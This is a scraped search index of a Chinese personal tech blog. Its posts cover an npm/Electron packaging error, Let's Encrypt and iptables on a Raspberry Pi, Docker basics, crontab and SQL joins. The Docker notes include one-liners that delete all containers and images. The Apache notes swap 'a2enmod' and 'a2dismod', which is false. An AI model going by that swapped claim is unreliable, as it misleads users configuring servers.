eslint@3.19.0~uninstall: eslint@3.19.0 1187 verbose unbuild rmStuff eslint@3.19.0 from C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules 1188 verbose unbuild rmStuff in node_modules 1189 verbose unlock done using C:\\Users\\Administrator\\AppData\\Roaming\\npm-cache\\_locks\\staging-834cabcd517fd52e.lock for C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\\.staging 1190 verbose stack Error: May not delete: C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\\.bin 1190 verbose stack at gentlyRm (C:\\Program Files\\nodejs\\node_modules\\npm\\lib\\utils\\gently-rm.js:49:15) 1190 verbose stack at gentlyRmBinRoot (C:\\Program Files\\nodejs\\node_modules\\npm\\lib\\unbuild.js:86:12) 1190 verbose stack at cb (C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\async-map.js:47:24) 1190 verbose stack at LOOP (C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\chain.js:7:26) 1190 verbose stack at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\chain.js:18:7 1190 verbose stack at C:\\Program Files\\nodejs\\node_modules\\npm\\lib\\utils\\gently-rm.js:70:40 1190 verbose stack at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\chain.js:16:22 1190 verbose stack at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\iferr\\index.js:11:16 1190 verbose stack at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\graceful-fs\\polyfills.js:284:29 1190 verbose stack at FSReqWrap.oncomplete (fs.js:153:21) 1191 verbose cwd C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app 1192 verbose Windows_NT 10.0.15063 1193 verbose argv \"C:\\\\Program Files\\\\nodejs\\\\node.exe\" \"C:\\\\Program Files\\\\nodejs\\\\node_modules\\\\npm\\\\bin\\\\npm-cli.js\" \"prune\" \"--production\" 1194 verbose node v8.5.0 1195 verbose npm v5.3.0 1196 error May not delete: C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\\.bin 1197 verbose exit [ 1, true ] ","date":"2017-09-15","objectID":"/blog/posts/logdown/2017-09-15-2463354/:0:0","tags":null,"title":"electron 新手轉exe筆記","uri":"/blog/posts/logdown/2017-09-15-2463354/"},{"categories":["Linux"],"content":"最近想讓動物機增加安全性，有看到免費的letsencrypt教學文 又好像有工具自動產生憑證 以經有看到勇者試了，當然也要嘗試:P 本來想說應該會很順利吧 結果沒有… 申請Let’s Encrypt－以Raspberry Pi為例 ， 再做這篇的時候會跳出版本太舊 sudo ./certbot-auto --apache --domain=**網域** certonly 動物機好像說版本太舊 $ sudo apt-get remove libaugeas0 augeas-tools libaugeas-dev $ sudo apt-get install libreadline6-dev libxml2-dev $ cd /tmp $ wget http://download.augeas.net/augeas-1.6.0.tar.gz $ tar -zxf augeas-1.6.0.tar.gz $ cd augeas-1.6.0 $ CFLAGS='-march=armv6 -mfpu=vfp -mfloat-abi=hard' CPPFLAGS='-march=armv6 -mfpu=vfp -mfloat-abi=hard' ./configure $ CFLAGS='-march=armv6 -mfpu=vfp -mfloat-abi=hard' CPPFLAGS='-march=armv6 -mfpu=vfp -mfloat-abi=hard' make $ sudo make install Let’s Encrypt for the Raspberry Pi (model B) 後來找上面那個方法還是沒用 最後賭升級sudo apt-get dist-uprgrade 升上去就可以跑了… 但會出現Timeout狀態 (之後有找到原因我的AP的 Virtual Server沒有設定443PORT) 不過我最後設完，apache設定沒有自動增加ssl設定 看來有機會還是要開一個apache筆記 最後看到另一篇用webroot方法，免費的 SSL 憑證：Let’s Encrypt！ sudo ./certbot-auto certonly --webroot -d ***網域*** Saving debug log to /var/log/letsencrypt/letsencrypt.log Plugins selected: Authenticator webroot, Installer None Obtaining a new certificate Performing the following challenges: http-01 challenge for **** Select the webroot for **** ------------------------------------------------------------------------------- 1: Enter a new webroot ------------------------------------------------------------------------------- Press 1 [enter] to confirm the selection (press 'c' to cancel): ** Invalid input ** Press 1 [enter] to confirm the selection (press 'c' to cancel): 1 Input the webroot for ******: (Enter 'c' to cancel): ------------------------------------------------------------------------------- does not exist or is not a directory ------------------------------------------------------------------------------- Input the webroot for ********: (Enter 'c' to cancel): /var/www/ Waiting for verification... Cleaning up challenges IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at: /etc/letsencrypt/live/****/fullchain.pem Your key file has been saved at: /etc/letsencrypt/live/****/privkey.pem Your cert will expire on 2017-12-10. To obtain a new or tweaked version of this certificate in the future, simply run certbot-auto again. To non-interactively renew *all* of your certificates, run \"certbot-auto renew\" - If you like Certbot, please consider supporting our work by: Donating to ISRG / Let's Encrypt: https://letsencrypt.org/donate Donating to EFF: https://eff.org/donate-le 看到這個就表示成功 申請的網域的SSL憑證 cert.pem: Your domain’s certificate Let’s Encrypt 的 鏈證書 chain.pem: The Let’s Encrypt chain certificate cert.pem 和 chain.pem 的合併檔 fullchain.pem: cert.pem and chain.pem combined SSL憑證的私鑰，千千萬萬要飽護好 privkey.pem: Your certificate’s private key \u003cVirtualHost *:443\u003e ServerAdmin service@**網域** DocumentRoot /var/www/ ServerName **網域** ServerAlias **網域** SSLEngine On SSLCertificateFile /etc/letsencrypt/live/**網域**/cert.pem SSLCertificateKeyFile /etc/letsencrypt/live/**網域**/privkey.pem SSLCertificateChainFile /etc/letsencrypt/live/**網域**/chain.pem SSLCACertificateFile /etc/letsencrypt/live/**網域**/fullchain.pem \u003c/VirtualHost\u003e Invalid command 'SSLEngine', perhaps misspelled or defined by a module not included in the server configuration 這個錯誤訊息是 沒有啟用ssl模組 啟用 sudo a2dismod ssl 但後來發現怎麼很多沒有教關閉 爬文一下就找到了 關閉 sudo a2enmod ssl 因為先前發現不能連webroot可以產生 但還是連不到443port 後來發現是Virtual Server沒設 設定完OK 想說試試第一個方法跑一次 結果跑出另一個憑證 爬文找刪除 直接刪資料夾是不能解決問題的XD 回收憑證 certbot revoke --cert-path /etc/letsencrypt/live/example.com/cert.pem certbot delete --cert-name example.com Ubuntu 12.04啟用apache的 SSL http://kirby86a.pixnet.net/blog/post/95136568-ubuntu-12.04%E5%95%9F%E7%94%A8apache%E7%9A%84-ssl 免費的 SSL 憑證：Let’s Encrypt！ https://ezbox.idv.tw/52/free-ssl-lets-encrypt-certbot/ 番外apache mod rewrite功能 sudo a2enmod rewrite or sudo ln -s /etc/apache2/mods-available/rewrite.load /etc/apache2/mods-enabled/rewrite.load 在/etc/apache2/sites-enabled/000-default AllowOverride None RewriteEngine on RewriteCond %{HTTPS} !=on #RewriteRule ^(.*","date":"2017-09-11","objectID":"/blog/posts/logdown/2017-09-11-erection-of-https/:0:0","tags":["Linux","TLS","SSL","Let’s Encrypt","Certbot"],"title":"Raspberry PI 自動設定Let’s Encrypt！ TLS(SSL 憑證)","uri":"/blog/posts/logdown/2017-09-11-erection-of-https/"},{"categories":["Linux"],"content":"最近想在動物機加上https協定 所以必須在iptables加上443 的port 但是…iptables早就忘了 原本設定 iptables -F iptables -P INPUT DROP iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT iptables -A INPUT -i lo -j ACCEPT #taiwan ip input http:80 iptables -A INPUT -s 61.216.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 218.160.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.62.248.0/21 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.20.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.72.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.72.0.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.242.0.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.71.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 203.75.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 202.39.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 103.25.236.0/22 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 1.160.0.0/12 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 114.32.0.0/12 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 122.120.0.0/13 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 60.249.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 60.250.0.0/15 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 59.124.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 220.128.0.0/18 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 114.30.32.0/20 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 61.217.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 61.228.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.22.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.21.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.75.0.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.242.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.61.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 203.74.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 203.66.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 43.255.92.0/22 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 1.34.0.0/15 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 114.24.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 118.160.0.0/13 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 122.116.0.0/15 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 125.224.0.0/13 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 60.248.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 175.111.192.0/18 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 61.218.0.0/15 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 61.220.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.23.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 59.112.0.0/13 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 211.75.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.241.224.0/19 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.59.128.0/17 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 210.65.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 203.69.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 36.224.0.0/12 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 111.240.0.0/12 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 118.168.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 122.118.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 125.232.0.0/15 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 168.95.0.0/16 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 59.120.0.0/14 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 218.168.0.0/13 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 61.224.0.0/14 -p tcp --dport 80 -j ACCEPT #dai taipei 61.70.239.206 iptables -A INPUT -s 115.43.78.0/24 -p tcp --dport 80 -j ACCEPT #3 ip-prefix split iptables -A INPUT -s 202.39.0.0/18 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 202.39.64.0/19 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -s 220.129.0.0/13 -p tcp --dport 80 -j ACC","date":"2017-09-10","objectID":"/blog/posts/logdown/2017-09-10-2375763/:0:0","tags":["Linux","iptables"],"title":"修改iptables設定筆記","uri":"/blog/posts/logdown/2017-09-10-2375763/"},{"categories":["寫程式一些事"],"content":"提醒一下自己，socket會有timeout問題 最近跟廠商接處，可能這點記錄一下 要做blog移轉，筆記先存檔… 這篇應該不會有實作= =||| ","date":"2017-09-08","objectID":"/blog/posts/logdown/2017-09-08-2327309/:0:0","tags":["socket"],"title":"socket的timeout問題","uri":"/blog/posts/logdown/2017-09-08-2327309/"},{"categories":["Windows"],"content":"半年前多，電腦會因為看影片快轉或放大縮小，會重新開機 我使用Potplayer播放器，有上網搜尋一下 有找到是顯示卡問題，但後來有更新顯示卡還是一樣 直到最近… (難得寫硬體筆記XD?!) 最近玩GTA5玩到一半會重新開機 一開始我以為是CPU 因為我CPU是4790k，玩遊戲CPU會超到9x度 不過後來我發現並非90度才會發生這個狀況 我後來玩GTA5 發現 縮小遊戲後放大後才會這樣 那時CPU原本待機也才5x度 不太可能是CPU過熱 我就開始更新主機版 ASUS Z79-Pro 的BIOS 更新完再測試，還是一樣會重新開機 但這次有跳出東西 ??? POWER有問題斷電??因為我POWER是買海韻 G-650 (聽說G650災情多 哀哀) 聽大廠不容易發生問題才對….，原先排除POWER，改電壓不穩來查 由於我家常常跳電，我有買一個UPS 我同學建議我先別插UPS上，直接插在插座 開GTA5還是一樣發生這個狀況，網路上還有說，把BIOS關掉…，一樣還有這個狀況 (奇怪怎麼有人說關掉可以解決??) 後來就絕望 最後我和同學估是CPU過熱或POWER問題 但因為海韻是大廠關係，所以先排除:| 然後就找4790k CPU風扇 當下有考慮買水冷 但因為水冷裝不好可能會造成整台電腦壞掉 因為哥電腦要撐10年… 在下沒膽 所以我有爬到散塔這個東西 Cooler Master Hyper 212X 跟 T40 後來網路上爬T40文獻比較多 https://www.youtube.com/watch?v=AEEmcgUZo7E 所以就選T40 最後，T40風扇真的不太好裝，花了2小時時間… 但測試溫度真的有差 平時待機T40大概4x度，原廠的約5x度 玩GTA5 T40大概最高7x度，原廠9x度 在以為全部都搞定的說 我玩GTA5玩到一半又重新開機了 #再次崩潰 後來發現影片快轉也會發生 ＂Power supply surges detected during the previous power on. ASUS Anti-Surge was triggered to protect system from unstable power supply unit! Press F1 to Run SETUP＂ 原來以前就會這樣orz，所以BIOS也還是要更新會比較好 在這期間，我還不死心的測試 有爬到有一個測試工具可以測POWER 一個叫OCCT，阿榮福利味有免安裝版 http://www.azofreeware.com/2016/05/occt.html 測試一下，馬上按ON就重新開機 原來死利 虧我這麼相信你 然後測到第三次，電腦會開機就會重開機(連到桌面到不了)PS: SSD開機不到30秒 最後就送修，有找到海韻快修中心 北部在台灣三重那邊，我有打電話過去問 他晚上6點就關門了… 六日也休息 所以我就用值班早上當天去用 網路上很多人換到不能用 我後來換回來使用正常 然後開機時顯示卡用YCbCr顏色正常，因為我之前螢幕顏色怪怪 現在正常了 最後，有簡單的暴力快轉影片放大、縮小，都正常 用OCCT測試5分鐘後，UPS會叫，後來停止測試又不會叫 但沒有重新開機了 (會叫的原因太操???) 至於GTA5待接下來假日再試啦 筆記就記到這了 結論 好的POWER帶你上天堂；壞的POWER帶你下地獄 可以安心睡覺 ","date":"2017-09-06","objectID":"/blog/posts/logdown/2017-09-06-reasons-unknown-computer-reboot-the-maintenance-records/:0:0","tags":null,"title":"電腦不明原因，玩遊戲或看影片重開機維修記錄","uri":"/blog/posts/logdown/2017-09-06-reasons-unknown-computer-reboot-the-maintenance-records/"},{"categories":["SQL"],"content":"在公司學到的東西，但還沒有實作過 先筆記一下 要做blog移轉，筆記先存檔… 刪除主鍵、鎖引鍵，要刪全部資料，才能做刪除動作 新增主鍵、鎖引鍵，聽說DB10才不用刪資料，就可以新增 ","date":"2017-08-25","objectID":"/blog/posts/logdown/2017-08-25-2214765/:0:0","tags":["sql","DB"],"title":"DB設定常常忘記一此筆記","uri":"/blog/posts/logdown/2017-08-25-2214765/"},{"categories":["JavaScript"],"content":"今天不熟網頁功能同事問我，他對設定用CSS(Bootstrap) disabled樣式 有沒有辦法讓他不用點 我立馬寫jQuery使用event.stopPropagation 結果發現沒有什麼作用 雖然後來網路找到解法，但這個雷記一下XD 希望下次別再踩到了 $(document).ready(function(){ $('a[disabled]').click(function(){ event.preventDefault(); }); }); event.preventDefault(); 終止預設行為，如上，不會對超連結做跳頁動作 event.stopPropagation()終止事件傳遞 希望不要再跳坑一次了XD 題外話：剛剛突然想到jQuery 預設事件是 氣泡事件，但突然想到jQuery怎麼預設 事件補捉 但…發現jQuery好像沒有事件補捉這個觸發 ","date":"2017-08-24","objectID":"/blog/posts/logdown/2017-08-24-2212154/:0:0","tags":["JavaScript","preventDefault和event","stopPropagation"],"title":"[JS]event.preventDefault和event.stopPropagation","uri":"/blog/posts/logdown/2017-08-24-2212154/"},{"categories":["Docker"],"content":" \u003cIfModule !mpm_prefork_module\u003e LoadModule cgid_module modules/mod_cgid.so \u003c/IfModule\u003e \u003cIfModule mpm_prefork_module\u003e LoadModule cgi_module modules/mod_cgi.so \u003c/IfModule\u003e ScriptAlias /cgi-bin/ \"/usr/local/apache/cgi-bin/\" apache [Wed Mar 19 15:40:31.179155 2014] [cgid:error] [pid 4796:tid 140208841959296] (13)Permission denied: AH01241: exec of '/var/cgi-bin/echo.pl' failed chmod +x /var/cgi-bin/echo.pl http://nohup.cc/article/206/ http://www.cnblogs.com/phpgo/p/5669818.html https://stackoverflow.com/questions/18392741/apache2-ah01630-client-denied-by-server-configuration ","date":"2017-08-22","objectID":"/blog/posts/logdown/2017-08-22-i-really-miss-the-leoboard-forums-with-docker-to-make-cgi-environment/:0:0","tags":["Docker"],"title":"好懷念leoboard論壇，用docker動手做cgi環境(未完成)","uri":"/blog/posts/logdown/2017-08-22-i-really-miss-the-leoboard-forums-with-docker-to-make-cgi-environment/"},{"categories":["Docker"],"content":"買Docker 入門與實戰，當然要記一下筆記… 以後開發盡量用Docker做:P docker run -it --name linux1 ubuntu 會執行會開linux bash 加個-d就會背景執行 docker run -itd --name linux1 ubuntu 要進入shell裡面 docker exec -it linux1 /bin/bash 當然，大家也可以試試看，如果沒有加 -it ，基本上，只 run 一下，馬上就跳回來了 XDD 那 -it 是甚麼意思呢，根據官方文件如下。 -i : Keep STDIN open even if not attached -t : Allocate a pseudo-tty Docker - Docker for Windows 10 入門篇 | 天空的垃圾場 要進入前先確定你的docker container是否有運行，才能進去 docker ps 查看運行中的container (新手常忘XD)查全部的container [運行+沒運行] docker ps -a 玩了這麼多，要刪掉那麼多測試的container 有什麼辦法呢XD 後來有找到 #################################### ## 小技巧 ########################## #################################### # 停止所有的 containers $ docker stop $(docker ps -a -q) # 刪除所有的 containers $ docker rm $(docker ps -a -q) # 刪除所有的 images $ docker rmi $(docker images -a -q) 參考來源：【Day 3】 - Docker 基本指令操作 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 host 與 container 互傳資料 這部分其實跟上面的 Dockerfile 沒甚麼關係，只是剛好可以一併提到，若是建立 container 時沒有使用 -v 參數掛載 host 目錄，還是可以用以下的命令可以將資料從 container 中複製出來： # 其中 python_flask 是 container 名稱 $ docker cp python_flask:/flask/app.py . 當然也可以把 host 資料放進 container 中： $ touch file_in_host $ docker cp file_in_host python_flask:/flask $ docker exec python_flask ls /flask app.py file_in_host 參考來源：https://godleon.github.io/blog/2015/11/27/Docker-Getting-Start-With-Dockerfile ","date":"2017-08-20","objectID":"/blog/posts/logdown/2017-08-20-2201711/:0:0","tags":["Docker"],"title":"Docker 新手筆記","uri":"/blog/posts/logdown/2017-08-20-2201711/"},{"categories":["Docker"],"content":"Data Volumes 以資料夾作為volume docker run -d -P --name web -v /src/webapp:/opt/webapp traning/webapp python app.py ","date":"2017-08-20","objectID":"/blog/posts/logdown/2017-08-20-2201711/:1:0","tags":["Docker"],"title":"Docker 新手筆記","uri":"/blog/posts/logdown/2017-08-20-2201711/"},{"categories":["Docker"],"content":"Data Volume Containers 建立一個資料卷容器，掛載在容器裡面 docker run -it -v /dbdata --name dbdata ubuntu --rm 跑完container會刪除 聽說container關了，裡面資料會不見 但是我…stop，再打開都還有東西 後來找到這篇要rm才會沒有東西XD 兩個dash，是什麼意思Google一下有找到解答 linux shell环境减号”-“的用途 | 等闲之辈莫等闲 docker container run ls -l docker container run -it xxx /bin/bash docker container ls docker container ls -a docker image pull xxx apt-get update -qq Is there a difference between “docker ps” and “docker container ls”? - Stack Overflow 差別 Docker 1.13 管理命令 - DockOne.io PAM-範例 – Benjr.tw /var/run是做什麼用 即将消逝的目录 /var/run ","date":"2017-08-20","objectID":"/blog/posts/logdown/2017-08-20-2201711/:2:0","tags":["Docker"],"title":"Docker 新手筆記","uri":"/blog/posts/logdown/2017-08-20-2201711/"},{"categories":["JavaScript"],"content":"npm install -g @angular/cli Angular Language Service Angular TypeScript Snippets for VS Code Prettier formatter for Visual Studio Code ng new coscup ng g c title 建立compent ng g d todo 建立Directive https://github.com/augt/S02Todo/tree/master/todomvc-template https://forum.angular.tw/t/coscup-workshop-angular/466/2 https://hackmd.io/p/HJwfMifD-#/6/2 ng generate pipe pipe/my-filer http://oomusou.io/angular/angular-coscup-api/ ng g i post ng g s services/data ","date":"2017-08-06","objectID":"/blog/posts/logdown/2017-08-06-anglular-random-notes/:0:0","tags":null,"title":"anglular隨意筆記","uri":"/blog/posts/logdown/2017-08-06-anglular-random-notes/"},{"categories":["HTML"],"content":"COSCUP VPS安全維護 可以iptable設定 waf(web application firewall) SELinux ssh(SSH) -\u003e ssh(WEB) log記錄到別台去 apache版本 https://www.slideshare.net/smalltown20110306/coscup-2017-infrastructure-as-code http://blog.chengweichen.com/2017/08/coscup-2017-ansible-gitlab-cicd.html ","date":"2017-08-05","objectID":"/blog/posts/logdown/2017-08-05-coscup-random-notes/:0:0","tags":null,"title":"COSCUP2017隨意筆記","uri":"/blog/posts/logdown/2017-08-05-coscup-random-notes/"},{"categories":["CSS"],"content":"https://www.facebook.com/WccCasper/videos/414910278905201/ https://paper.dropbox.com/doc/Flex-1lWq76W07m67326psOncP http://wcc723.github.io/WorkShop-gh-pages/cssFlex/ ","date":"2017-08-03","objectID":"/blog/posts/logdown/2017-08-03-cssflex-notes/:0:0","tags":["CSS","flex"],"title":"[CSS]flex筆記","uri":"/blog/posts/logdown/2017-08-03-cssflex-notes/"},{"categories":["Linux"],"content":"最近想自動建立年月份資料夾 雖然crontab -e和crontab -l指令還記得 不過設定都會忘記XD 再此筆記 每季新番我都要在transmission建立資料夾 建久了就想自動化 首先，先查要怎麼新增當下年月資料夾 我知道Linux的date可以看時間 http://yuanann.pixnet.net/blog/post/13384335-linux-%3Adate-%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95 mkdir `date \"+%Y%m\"` `這個就可以了，Ruby也是這樣設定 怎麼使用別的使用者執行呢? sudo -u debian-transmission crontab -e http://linux.vbird.org/linux_basic/0430cron.php#crontab 重點我每次都會忘Crontab內容怎麼設定XD 看了設定也有點不安… 不過我想到Regex都有Online線上測試 不知道Crontab也有沒有XD (之前有悲劇每秒執行程式 囧) https://crontab.guru/ http://cron.schlitt.info/ 有了這個真的方便多了:P 0 1 1 1,4,7,11 * mkdir `date \"+%Y%m\"` 參考來源： https://coder.tw/?p=7284 http://linux.vbird.org/linux_basic/0430cron.php#crontab http://yuanann.pixnet.net/blog/post/13384335-linux-%3Adate-%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95 ","date":"2017-08-02","objectID":"/blog/posts/logdown/2017-08-02-2131881/:0:0","tags":["Linux","Crontab"],"title":"Crontab排程設定","uri":"/blog/posts/logdown/2017-08-02-2131881/"},{"categories":["Linux"],"content":"在.zshrc加入 export DEFAULT_USER=`whoami` 完成 ubuntu 安裝字型 apt-get install powerline ","date":"2017-07-26","objectID":"/blog/posts/logdown/2017-07-26-2086815/:0:0","tags":["zsh","Linux"],"title":"zsh前面「使用者@電腦」拿掉","uri":"/blog/posts/logdown/2017-07-26-2086815/"},{"categories":["CI"],"content":"原本想使用python的yamllint 不過使用python的yamllint會有一些問題 像一行超過80個字 (奇怪…有這個規定??) 後來用node的yamllint就沒問題 pipelines: default: - step: script: # Modify the commands below to build your repository. - npm install -g yaml-lint - yamllint bitbucket-pipelines.yml 錯誤時候，會發Email通知，成功不會發通知。 有空再好好研究還能怎麼玩:P 參考來源： http://ithelp.ithome.com.tw/articles/10187774 http://ithelp.ithome.com.tw/articles/10187137 ","date":"2017-07-24","objectID":"/blog/posts/logdown/2017-07-24-2082428/:0:0","tags":["CI","BitBucket"],"title":"BitBucket的CI簡單測試記錄","uri":"/blog/posts/logdown/2017-07-24-2082428/"},{"categories":["實用工具"],"content":"之前在MAC看到很多很旋的命令提示字元 想說Window沒有這個命 結果今天聽同事說Window也能用 就馬上試了一下，記錄下來XD 安裝babun，主要裡的zsh是我們要的XD 安裝完，遇設主題都幫我們裝好了 輸入vim ~/.zshrc 修改 ZSH_THEME=\"agnoster\" 重啟zsh就正常了，什麼zsh亂碼 有試著裝powerline字型都失敗 後來同事推薦hack字型 修改zsh字型就正常了:D 20170724 有些符號還是沒法出來 後來試了這個，成功出來了！ https://github.com/powerline/fonts/blob/master/DejaVuSansMono/DejaVu%20Sans%20Mono%20for%20Powerline.ttf ","date":"2017-07-18","objectID":"/blog/posts/logdown/2017-07-18-2067199/:0:0","tags":["Linux","zsh"],"title":"好看的bash工具 -zsh","uri":"/blog/posts/logdown/2017-07-18-2067199/"},{"categories":["JavaScript"],"content":"這一篇只是程式記錄，沒有完成非常大的東西… 最近想手動做個拖拉功能 不太想用jQuery UI套Dialog上去 有參考來做換色與快速整理的便利貼牆吧！這個教學方法 不過想自己試試純JS做出來 後來移動出問題，解不出來 Google一下有看到有人寫一隻 多個DIV共用自由移動DIV的程式 有遇到幾個問題，在此記錄 http://jsbin.com/qexuvawolo/edit?js,output var top1=0,left1=0; var moveFunction = function(event){ console.log('x=',event.clientX); console.log('y=',event.clientY); console.log('ox=',event.offsetX); console.log('oy=',event.offsetY); document.getElementById('dialog').style.top = event.clientY - top1+ \"px\"; document.getElementById('dialog').style.left = event.clientX - left1 + \"px\"; }; var mousedownFunction = function(event){ top1 = event.offsetX; //event.clientY - obj.offsetTop left1 = event.offsetY; //event.clientX - obj.offsetLeft document.getElementById('dialog').addEventListener('mousemove',moveFunction); } document.getElementById('dialog').addEventListener('mousedown',mousedownFunction); document.getElementById('dialog').addEventListener('mouseup',function(){ document.getElementById('dialog').removeEventListener('mousemove',moveFunction); }); http://jsbin.com/qexuvawolo/edit?js,output mousedown記錄點擊位置到物件top,left之間距離 這部份我想了很久，繪了簡單的圖 mousemover設定移動位置(新的Event.ClinetX位置-mousedown的left位置) mouseup取消移動的監聽事件 當然我這個method還無法模組化…，有空在把他改的比較好看 上面找的範例他把document.mousemove做全域使用 這樣移出body視窗，不會有問題 可能我也要好好想一下，怎麼寫會比較好 順便記錄一下別的東西 event.screenX,event.screenY 從螢幕到event距離 event.clientX,event.clientY(event.pageX,event.pageY) 瀏覽器窗口到event距離 event.offsetX,event.offsetY 目前物件到event距離 最後，之後再想想做放大縮小要怎麼做:) ","date":"2017-07-16","objectID":"/blog/posts/logdown/2017-07-16-2052650/:0:0","tags":["JavaScript"],"title":"簡單玩了一下拖拉窗視","uri":"/blog/posts/logdown/2017-07-16-2052650/"},{"categories":["SQL"],"content":"最近在 left join 使用 on 做篩選 結果出來跟我想要的不太一樣 後來有爬文找到原因 from a left join b on a.id=b.id and b.word = 'xxxx' 結果跑出來東西是多筆 其實以上結果的關鍵原因就是 left join,right join,full join 的特殊性，不管 on 上的條件是否為真都會返回 left 或 right 表中的記錄，full 則具有 left 和 right 的特性的並集。 而 inner join 沒這個特殊性，則條件放在 on 中和 where 中，返回的結果集是相同的。 http://blog.sina.com.cn/s/blog_6826662b0101atu1.html http://louis176127.pixnet.net/blog/post/186150706-sql-%E6%A2%9D%E4%BB%B6%E5%BC%8F%E5%AF%AB%E5%9C%A8on%E4%BB%A5%E5%8F%8Awhere%E7%9A%84%E5%B7%AE%E5%88%A5 2018-12-24 子查詢 join 無法抓到外面的表 終於知道為什麼子查詢沒辦法抓取外面的表 | 程式狂想筆記 2018-12-25 SELECT xxx,ooo FROM table1 ous LEFT JOIN table2 vc ON vc.user_id = 'dddddd' AND vc.type = 'ADD' AND vc.cancel IS NULL AND DATE_FORMAT(vc.end_date, '%Y-%m-%d') \u003e= DATE_FORMAT('2018-01-01', '%Y-%m-%d') AND DATE_FORMAT(START_DATE, '%Y-%m-%d') \u003c DATE_FORMAT('2018-11-02' , '%Y-%m-%d') WHERE ous.uid = 'dddddd' ORDER BY vc.sid DESC LIMIT 1 移至 WHERE 結果是不一樣的!!! 因為是 LEFT JOIN 所以 ous 不管做甚麼條件，都不會消失 vc 會變成 null SELECT xxx,ooo FROM table1 ous LEFT JOIN table2 vc ON vc.user_id = 'dddddd' AND vc.type = 'ADD' AND vc.cancel IS NULL WHERE ous.uid = 'dddddd' AND DATE_FORMAT(vc.end_date, '%Y-%m-%d') \u003e= DATE_FORMAT('2018-01-01', '%Y-%m-%d') AND DATE_FORMAT(START_DATE, '%Y-%m-%d') \u003c DATE_FORMAT('2018-11-02' , '%Y-%m-%d') 